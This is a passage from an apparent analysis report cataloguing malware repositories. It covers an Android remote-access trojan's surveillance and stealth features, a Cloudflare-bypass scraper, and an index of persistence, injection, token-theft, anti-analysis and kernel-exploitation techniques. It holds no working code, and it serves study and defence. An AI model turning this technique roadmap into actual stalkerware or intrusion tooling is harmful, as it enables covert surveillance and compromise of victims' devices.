  - UAC elevation manifest option
  - Builder finds system Python for compilation

### TECHNIQUE: Persistence
  - /startup: creates registry Run key entry
  - /rmstartup: removes persistence

================================================================================
13. egnake-rat — Android RAT with Flask Dashboard
================================================================================

Source files read: EgnakeRAT.py (156 lines), server/crypto.py (53 lines),
                   server/c2_server.py (350 lines), server/protocol.py (125 lines),
                   server/database.py (229 lines), plus 27 Android Java files

### TECHNIQUE: Python Async C2 Server
  - asyncio-based TCP server (asyncio.start_server)
  - Client handler per connection with reader/writer
  - Heartbeat monitoring for device liveness
  - Concurrent client handling with async/await

### TECHNIQUE: AES-256-CBC Encryption
  - Key derivation: SHA-256 of passphrase
  - 16-byte random IV (os.urandom)
  - AES.MODE_CBC from pycryptodome
  - PKCS7 padding via Crypto.Util.Padding
  - Base64 encoding for transport
  - encrypted = base64.b64encode(iv + ciphertext)
  - Key hash: MD5 of derived key for verification

### TECHNIQUE: Binary Protocol Framing
  - 4-byte big-endian length prefix: struct.pack(">I", len)
  - Max message size: 50MB
  - JSON payload after length prefix
  - Full AES encryption of JSON payload

### TECHNIQUE: Protocol Message Types
  - handshake, heartbeat, command, response, stream
  - shell_io, disconnect, keylog, screen_frame, notification_data
  - UUID-based command IDs for tracking

### TECHNIQUE: Android Commands (40+)
  - deviceInfo, camList, takepic, startVideo, stopVideo
  - startAudio, stopAudio, getSMS, getCallLogs, getLocation
  - getContacts, getIP, getMACAddress, getSimDetails
  - getClipData, getInstalledApps, getBatteryStatus, getWifiInfo
  - screenshot, shell, shellCmd, shellExit
  - vibrate, openUrl, sendSMS, showToast, lockScreen
  - getNotifications, fileDownload, fileUpload, fileList, fileDelete
  - startKeylogger, stopKeylogger, readScreen, performAction
  - checkAccessibility, enableAccessibility
  - startScreenStream, stopScreenStream, makeCall

### TECHNIQUE: Web Dashboard (Flask + Socket.IO)
  - Real-time device status via WebSocket
  - File browser, shell terminal, camera viewer
  - Device statistics dashboard
  - Bootstrap-based responsive UI

### TECHNIQUE: SQLite Database (Persistent Logging)
  - Tables: devices, command_history, files, sessions, keylogs, notifications
  - Thread-local connections with WAL journal mode
  - Device upsert pattern (INSERT ON CONFLICT UPDATE)
  - Tracks: device info, online status, battery, WiFi SSID, IP, MAC, country

### TECHNIQUE: Android Client — Accessibility Service Abuse
  - RATAccessibilityService.java
  - Keylogger via accessibility events
  - Screen content reading
  - UI interaction (performAction)
  - Notification interception
  - Runs as foreground service to prevent system kill

### TECHNIQUE: Android Client — JobScheduler Persistence
  - jobScheduler.java
  - Ensures service restarts after system reboots
  - Android JobScheduler API for periodic wakeup

### TECHNIQUE: Android Client — Broadcast Receiver
  - broadcastReciever.java
  - Listens for boot completed
  - Auto-starts service on device boot

### TECHNIQUE: Android Client — TCP Connection Manager
  - tcpConnection.java
  - Persistent TCP connection with reconnection
  - Encryption/decryption layer
  - Heartbeat mechanism

### TECHNIQUE: Android Client — Crypto Helper
  - CryptoHelper.java
  - AES-256-CBC matching server implementation
  - SHA-256 key derivation
  - Base64 encoding

### TECHNIQUE: Android Client — Payloads
  - audioManager.java — audio recording
  - videoRecorder.java — video recording
  - CameraPreview.java — camera access
  - locationManager.java — GPS tracking
  - readSMS.java — SMS reading
  - readCallLogs.java — call log extraction
  - ipAddr.java — IP address gathering
  - newShell.java — interactive shell
  - ScreenStreamService.java — real-time screen streaming
  - vibrate.java — device vibration control

### TECHNIQUE: Android Client — Stealth
  - Icon hidden by default: configurable via builder
  - App name and package disguise
  - Foreground service notification customization

### TECHNIQUE: ngrok Tunnel Integration
  - Automatic ngrok TCP tunnel
  - DNS resolution of ngrok domain
  - Simplifies NAT/firewall traversal
  - Both server and build modes support ngrok

### TECHNIQUE: APK Builder (Config Injection)
  - Generates config.java with embedded IP, port, passphrase
  - Gradle-based build: ./gradlew assembleRelease
  - Icon visibility toggle

================================================================================
14. botasaurus — Cloudflare Bypass
================================================================================

Source files analyzed: Multiple Python/TypeScript files for web scraping framework.
Key components: sqlite-cache-storage, pg-cache-storage, botasaurus-server-js.

### TECHNIQUE: Cloudflare Anti-Bot Bypass
  - Browser automation-based approach (likely playwright/puppeteer)
  - JavaScript challenge solving
  - Cookie management for session persistence
  - Cache-based storage for bypass tokens

### TECHNIQUE: Kubernetes Deployment
  - run-scraper-in-kubernetes.md
  - vm-scripts/ for VM setup
  - Containerized scraping infrastructure

### TECHNIQUE: Caching Layer
  - SQLite and PostgreSQL cache storage backends
  - Package-based architecture with setup.py

### TECHNIQUE: Distributed Scraping Server
  - TypeScript/Node.js server
  - Worker executor for parallel scraping
  - NDJSON streaming for results
  - Task queue and execution management
  - Pagination, filtering, sorting support

================================================================================
TECHNIQUE INDEX — Cross-Repo Patterns
================================================================================

### CRYPTO PATTERNS:
  - XOR encryption with static key (RATwurst, living-off-the-land)
  - Progressive XOR (key += 5 each byte) (living-off-the-land)
  - AES-256-CBC with SHA-256 key derivation (egnake-rat)
  - GZip + XOR layering (living-off-the-land)
  - Base64 transport encoding (egnake-rat, vortex-rat)
  - MD5 for device fingerprint (vortex-rat)
  - SHA-256 for hash variation (egnake-rat)

### PERSISTENCE PATTERNS:
  - Registry Run key (RATwurst, keylogger, vortex-rat)
  - Hidden registry values with NUL chars (living-off-the-land)
  - Registry-stored executable (living-off-the-land)
  - System tray icon (vortex-rat)
  - JobScheduler (egnake-rat Android)
  - Broadcast receiver on boot (egnake-rat Android)
  - File copy to temp + run (RATwurst)
  - Windows service (vortex-rat)

### INJECTION PATTERNS:
  - Process Hollowing / RunPE (living-off-the-land, code-injection-malware)
  - Reflective DLL injection (code-injection-malware)
  - APC injection (code-injection-malware)
  - Thread hijacking (code-injection-malware)
  - SetWindowsHookEx injection (code-injection-malware, h00k, keylogger)
  - COM hijacking (code-injection-malware)
  - AppInit_DLLs / AppCertDLLs (code-injection-malware)
  - IFEO injection (code-injection-malware)

### TOKEN MANIPULATION:
  - Token stealing (OpenProcessToken + DuplicateTokenEx)
  - Token impersonation (ImpersonateLoggedOnUser)
  - UAC bypass via token duplication (auto-elevated process)
  - Make token (CreateProcessWithLogonW with LOGON_NETCREDENTIALS_ONLY)
  - PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
  - SeDebugPrivilege enablement

### C2 PATTERNS:
  - Telegram bot as C2 (vortex-rat)
  - Raw TCP with custom encryption (RATwurst, egnake-rat)
  - Web dashboard with Socket.IO (egnake-rat)
  - Async Python asyncio server (egnake-rat)
  - Multi-threaded socket server (RATwurst)

### ANTI-ANALYSIS:
  - API string obfuscation via char arrays (RATwurst)
  - Dynamic API resolution (RATwurst, living-off-the-land)
  - Sandbox detection via process count (RATwurst)
  - VM detection via process name (RATwurst)
  - Timing-based debugger detection via QueryPerformanceCounter (RATwurst)
  - Hash variation via seed change (keylogger)

### KERNEL EXPLOITATION:
  - Use-after-free in binder driver (CVE-2019-2215)
  - Heap grooming via iovec structures
  - addr_limit bypass for kernel R/W
  - cred structure patching for root
  - SELinux disabling
  - KASLR bypass via nsproxy symbol offset

### APPLICATION EXPLOITATION:
  - OPC UA protocol abuse (CVE-2023-32174)
  - Post-auth use-after-free via race condition
  - OPC UA session manipulation

================================================================================
END OF ANALYSIS
